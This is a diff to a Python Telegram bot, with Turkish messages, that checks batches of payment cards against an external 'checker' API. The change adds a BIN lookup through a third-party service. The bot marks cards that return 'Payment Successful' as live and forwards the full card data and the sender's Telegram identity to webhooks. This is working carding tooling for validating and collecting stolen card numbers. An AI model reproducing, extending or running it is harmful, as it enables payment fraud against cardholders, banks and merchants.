@@ -25,6 +25,17 @@ API_URL = "https://metalix.store/api/uts/api.php"
 
 bot = TeleBot(BOT_TOKEN)
 
+def get_bin_info(bin_code):
+    try:
+        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}")
+        if response.status_code == 200:
+            data = response.json()
+            return data.get("result", "❌ BIN bilgisi alınamadı")
+        else:
+            return "❌ BIN bilgisi alınamadı"
+    except:
+        return "❌ BIN bilgisi alınamadı"
+
 def send_to_webhook(content, webhook_url):
     try:
         requests.post(webhook_url, json={"content": content})
@@ -49,6 +60,8 @@ def aes_decrypt(data_base64, key):
     encrypted_data = base64.b64decode(data_base64)
     decrypted = unpad(cipher.decrypt(encrypted_data), AES.block_size)
     return decrypted.decode()
+
+
 
 def check_card(card):
     try:
@@ -82,11 +95,11 @@ def check_card(card):
         response = requests.post(API_URL, headers=headers, files=files, timeout=15)
         if response.status_code == 200:
             decrypted_response = aes_decrypt(response.text.strip(), AES_KEY)
-            return {"message": decrypted_response, "details": "Metalix Checker"}
+            return {"message": decrypted_response, "details": ""}
         else:
-            return {"message": f"Hata HTTP {response.status_code}", "details": "Metalix Checker"}
+            return {"message": f"Hata HTTP {response.status_code}", "details": ""}
     except Exception as e:
-        return {"message": f"❌ API Hatası: {str(e)}", "details": "Metalix Checker"}
+        return {"message": f"❌ API Hatası: {str(e)}", "details": ""}
 
 @bot.message_handler(commands=['check'])
 def check_command(message):
@@ -117,13 +130,15 @@ def check_command(message):
 
         result = check_card(card)
         message_text = result.get("message", "")
-        details = result.get("details", "❌ BIN bilgisi alınamadı")
+
+        bin_code = card.split("|")[0][:6]
+        bin_info = get_bin_info(bin_code)
 
         durum = "✅" if "Payment Successful" in message_text else "❌" if "Kart" in message_text or "Card" in message_text else "❓"
 
         mesaj = f"🔄 Checklenen Kart: {idx}/{total}\n━━━━━━━━━━━━━━━\n"
         mesaj += f"💳 Kart Bilgisi\n• Kart: {card}\n━━━━━━━━━━━━━━━\n"
-        mesaj += f"🏦 BIN Bilgisi\n• {details}\n━━━━━━━━━━━━━━━\n"
+        mesaj += f"🏦 BIN Bilgisi\n• {bin_info}\n━━━━━━━━━━━━━━━\n"
         mesaj += f"📊 Sonuç\n• Durum: {durum} {message_text}\n━━━━━━━━━━━━━━━"
 
         bot.send_message(message.chat.id, mesaj)
@@ -131,7 +146,7 @@ def check_command(message):
         sender_info = f"👤 @{message.from_user.username or message.from_user.first_name} | ID: {message.from_user.id}"
 
         if "Payment Successful" in message_text:
-            live_list.append(f"{card} → {details}")
+            live_list.append(f"{card} → {bin_info}")
             send_to_webhook(f"{card} → ✅ {message_text} - {sender_info}", WEBHOOK_LIVE)
         elif any(word in message_text for word in ["Declined", "Kart", "Card", "Banka", "onaylanmadı"]):
             send_to_webhook(f"{card} → ❌ {message_text} - {sender_info}", WEBHOOK_DECLINED)
